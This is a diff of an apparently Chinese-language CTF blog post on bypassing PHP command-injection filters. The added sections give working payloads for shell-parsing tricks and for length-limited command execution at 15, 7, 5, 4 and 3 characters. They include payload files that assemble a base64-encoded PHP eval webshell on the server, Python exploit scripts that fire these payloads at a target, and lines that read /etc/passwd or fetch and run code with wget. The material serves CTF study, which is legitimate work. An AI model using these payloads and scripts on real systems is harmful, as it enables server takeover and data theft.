@@ -28,12 +28,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="命令执行例子 12345&lt;?php$target&#x3D;$_REQUEST[&amp;#x27;ip&amp;#x27;];$cmd &#x3D; shell_exec(&amp;#x27;ping &amp;#x27;.$target);echo &quot;&lt;pre&gt;&amp;#123;$cmd&amp;#125;&lt;&#x2F;pre&gt;&quot;;?&gt; 传入?ip&#x3D;|whoami就可以执行命令 PHP危险函数 phpinfo()">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211103232117799.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211103235911293.png">
 <meta property="article:published_time" content="2020-08-07T07:48:17.000Z">
-<meta property="article:modified_time" content="2021-09-27T13:53:09.505Z">
+<meta property="article:modified_time" content="2021-11-08T10:13:51.016Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211103232117799.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -289,7 +292,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.8k</span>Reading time: <span class="post-count reading-time">7 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.1k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -514,12 +517,77 @@ height:50vh;
 <h3 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h3><ul>
 <li>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS​$1-d|sh<br>其中Y2F0IGZsYWcucGhw是cat flag.php的base64-encode</li>
 </ul>
-<h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><ul>
+<h3 id="shell解析绕过"><a href="#shell解析绕过" class="headerlink" title="shell解析绕过"></a>shell解析绕过</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xunbu7/p/6187017.html">https://www.cnblogs.com/xunbu7/p/6187017.html</a></p>
+<ul>
+<li><p>$()的作用跟反引号差不多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;whoami&#96;&#x3D;&#x3D;$(whoami)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>$(())中可以进行变量的运算，如<code>+-*/%</code>及位运算<code>&amp;|^!</code></p>
+</li>
+<li><p>${}用于界定变量，如<code>$&#123;A&#125;B</code>表示取A变量的值再加上B，<code>$AB</code>表示变量AB</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(())表示0</span><br><span class="line">$((~$(())))表示-1</span><br></pre></td></tr></table></figure>
+
+<p>那么就可以通过累加达到-38取反得到37再累加-1得到36，最终读取到36.php的内容</p>
+<p>如payload就可以累加到36.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$(($((~$(($(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))$(($((~$(())))$((~$(())))))))))$((~$(())))))</span><br></pre></td></tr></table></figure>
+
+<p>例题：<a target="_blank" rel="noopener" href="https://ctf.show/challenges#web57-420">ctfshow57</a></p>
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令。</p>
+<h3 id="15个可控字符下的命令执行"><a href="#15个可控字符下的命令执行" class="headerlink" title="15个可控字符下的命令执行"></a>15个可控字符下的命令执行</h3><p>思路：采用<code>&gt;</code>和<code>&gt;&gt;</code>符号将一句话木马写入shell文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo \&lt;?php&gt;1</span><br><span class="line">echo eval\(&gt;&gt;1</span><br><span class="line">echo \$_GET&gt;&gt;1</span><br><span class="line">echo \[1\]&gt;&gt;1</span><br><span class="line">echo \)\;&gt;&gt;1</span><br><span class="line">mv 1 1.php</span><br><span class="line"># 生成</span><br><span class="line">&lt;?php</span><br><span class="line">eval(</span><br><span class="line">$_GET</span><br><span class="line">[1]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211103232117799.png" alt="image-20211103232117799"></p>
+<h3 id="7个字符的命令执行"><a href="#7个字符的命令执行" class="headerlink" title="7个字符的命令执行"></a>7个字符的命令执行</h3><p>预备知识：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -t #将创建的文件按从晚到早的顺序排列</span><br><span class="line">sh a #执行a中的命令</span><br><span class="line">\ #拼接字符串</span><br><span class="line">base64 #对字符串进行base64编码防止特殊字符扰乱</span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>]&lt;=<span class="number">7</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>思路：</p>
+<p>最终执行的命令<code>“echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d&gt;1.php”</code>,其中base64编码的字符串为<code>&lt;?php eval($_POST[1]);?&gt;</code></p>
+<p>payload.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;&#x3D;&#x3D;\\</span><br><span class="line">&gt;pOw\\</span><br><span class="line">&gt;MV0\\</span><br><span class="line">&gt;1Rb\\</span><br><span class="line">&gt;BPU\\</span><br><span class="line">&gt;kX1\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.119.132:8080/7.php?1=&#123;0&#125;&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">&quot;[+]&quot;</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.119.132:8080/7.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行命令生成1.php</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211103235911293.png" alt="image-20211103235911293"></p>
+<h3 id="5位字符的命令执行"><a href="#5位字符的命令执行" class="headerlink" title="5位字符的命令执行"></a>5位字符的命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$sandbox = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="string">&#x27;orange&#x27;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">	@mkdir($sandbox);</span><br><span class="line">	@chdir($sandbox);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . $sandbox);</span><br><span class="line">	&#125;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</span><br><span class="line">2. 通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</span><br><span class="line">3. 用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</span><br><span class="line">&gt;rev</span><br><span class="line">echo 1234 &gt; v</span><br><span class="line">*v （等同于命令：rev v）</span><br><span class="line">网上有两种解答的方式：一种是curl服务起上写好的文件，进行反弹Shell，而另一种就是写入一句话木马，网上文章详细的解释参看https:&#x2F;&#x2F;www.freesion.com&#x2F;article&#x2F;8743881775&#x2F;，我来将可用性最高的一种方法记录下。</span><br><span class="line">目的：echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php</span><br><span class="line">那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下</span><br></pre></td></tr></table></figure>
+
+<p>payload.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\</span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh 0</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.119.132:8080/5/5.php?cmd=&#123;0&#125;&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        print(<span class="string">&quot;[*]&quot;</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line">        <span class="comment">#检查是 否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.119.132:8080/5/42f05af66541e59c081c45d5ec9cbaa6/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="4位可控字符的命令执行"><a href="#4位可控字符的命令执行" class="headerlink" title="4位可控字符的命令执行"></a>4位可控字符的命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">	$sandbox = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.md5(<span class="string">&quot;orange&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">	mkdir($sandbox);</span><br><span class="line">	chdir($sandbox);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>)&#123;</span><br><span class="line">        exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将payload.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\</span><br><span class="line">&gt;1.\</span><br><span class="line">&gt;\&gt;\</span><br><span class="line">&gt;-d\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;64\</span><br><span class="line">&gt;se\</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;7\</span><br><span class="line">&gt;Sk\</span><br><span class="line">&gt;X\</span><br><span class="line">&gt;x\</span><br><span class="line">&gt;Fs\</span><br><span class="line">&gt;FV\</span><br><span class="line">&gt;d\</span><br><span class="line">&gt;X0\</span><br><span class="line">&gt;k\</span><br><span class="line">&gt;g\</span><br><span class="line">&gt;bC\</span><br><span class="line">&gt;h\</span><br><span class="line">&gt;XZ\</span><br><span class="line">&gt;gZ\</span><br><span class="line">&gt;A\</span><br><span class="line">&gt;aH\</span><br><span class="line">&gt;w\</span><br><span class="line">&gt;D9\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\</span><br><span class="line">&gt;IF\</span><br><span class="line">&gt;&#123;\</span><br><span class="line">&gt;\$\</span><br><span class="line">&gt;o\</span><br><span class="line">&gt;ch\</span><br><span class="line">&gt;e\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    lock.acquire(<span class="literal">True</span>)<span class="comment">#锁定</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.119.132:8080/4/4.php?cmd=&#123;0&#125;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            print(<span class="string">&quot;[*]&quot;</span> + url.format(i.strip()))</span><br><span class="line">            requests.get(url.format(i.strip()))</span><br><span class="line">            <span class="comment"># 检查是否攻击成功</span></span><br><span class="line">    test = requests.get(<span class="string">&quot;http://192.168.119.132:8080/4/2ad26c4b0f3cdead3c4c1955ad805b8d/1.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> test.status_code == requests.code.ok:</span><br><span class="line">        print(<span class="string">&quot;[*]Attack access!!!!&quot;</span>)</span><br><span class="line">    lock.release() <span class="comment">#释放</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = threading.Thread(target=exp)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3位字符命令执行"><a href="#3位字符命令执行" class="headerlink" title="3位字符命令执行"></a>3位字符命令执行</h3><p>来自ctfshow的nl题命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用ls查看目录，然后生成文件od或者nl,传入<code>*</code>即可查看flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;ls</span><br><span class="line">?1&#x3D;&gt;od或?1&#x3D;nl</span><br><span class="line">?1&#x3D;*</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h2><ul>
 <li>a=l;b=s;$a$b</li>
 <li>未定义的初始化变量 cat$x /etc/passwd</li>
 </ul>
-<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
-<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
 <h2 id="反斜杠和斜杠绕过"><a href="#反斜杠和斜杠绕过" class="headerlink" title="反斜杠和斜杠绕过"></a>反斜杠和斜杠绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="variable">$&#123;HOME:0:1&#125;</span>etc<span class="variable">$&#123;HOME:0:1&#125;</span>passwd</span><br></pre></td></tr></table></figure>
 
 <h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><ul>
@@ -555,7 +623,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
